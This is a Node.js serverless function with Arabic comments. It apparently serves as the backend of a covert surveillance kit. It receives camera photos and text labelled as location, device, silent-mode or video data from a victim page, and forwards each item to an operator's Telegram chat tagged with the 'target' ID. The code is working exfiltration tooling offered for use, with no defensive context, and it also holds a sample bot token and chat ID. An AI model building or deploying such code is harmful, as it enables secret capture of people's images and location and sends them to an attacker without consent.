
// api/send.js — وسيط التطبيق (Vercel Serverless, Node 18+)
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ ok: false, error: 'POST only' });
    }

    // ====== التوكن والمعرف من إعدادات مشروعك على Vercel ======
    // (لن تظهر أبداً في الملفات المنشورة ولا في الروابط)
    const TOKEN = process.env.TELEGRAM_TOKEN || '';
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

    // ⚠️ بديل مؤقت فقط (ضع القيم ثم احذف الأسطر الخاصة بالمتغيرات):
    // const TOKEN = '123456789:AAFxxxxxxxx';
    // const CHAT_ID = '1015102519';
    // =========================================================

    if (!TOKEN || !CHAT_ID) {
        return res.status(500).json({ ok: false, error: 'مفاتيح الخادم غير مضبوطة بعد' });
    }

    let body;
    try {
        body = typeof req.body === 'object' ? req.body : JSON.parse(req.body);
    } catch {
        return res.status(400).json({ ok: false, error: 'JSON غير صالح' });
    }

    const chatId = String(body.chatId || '').slice(0, 64);
    if (!chatId) return res.status(400).json({ ok: false, error: 'chatId مفقود' });

    const tg = `https://api.telegram.org/bot${TOKEN}`;

    try {
        // ====== صورة (كاميرا) ======
        if (body.type === 'photo') {
            const dataUrl = String(body.photo || '');
            const base64 = dataUrl.includes(',') ? dataUrl.split(',')[1] : dataUrl;
            const buf = Buffer.from(base64, 'base64');
            if (!buf.length || buf.length > 4 * 1024 * 1024) {
                return res.status(400).json({ ok: false, error: 'صورة غير صالحة' });
            }
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('caption',
                `${body.caption || '📸 صورة'}\n👤 الهدف: ${chatId}\n🕐 ${new Date().toLocaleString('ar')}`);
            form.append('photo', new Blob([buf], { type: 'image/jpeg' }), `cap_${chatId}.jpg`);

            const r = await fetch(`${tg}/sendPhoto`, { method: 'POST', body: form });
            const j = await r.json().catch(() => ({}));
            return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description });
        }

        // ====== نص (موقع/جهاز/صامت/فيديو) ======
        const text = String(body.text || '').slice(0, 4000);
        if (!text) return res.status(400).json({ ok: false, error: 'نص فارغ' });

        const r = await fetch(`${tg}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `${text}\n👤 الهدف: ${chatId}`
            })
        });
        const j = await r.json().catch(() => ({}));
        return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description });

    } catch (e) {
        return res.status(500).json({ ok: false, error: e.message });
    }
}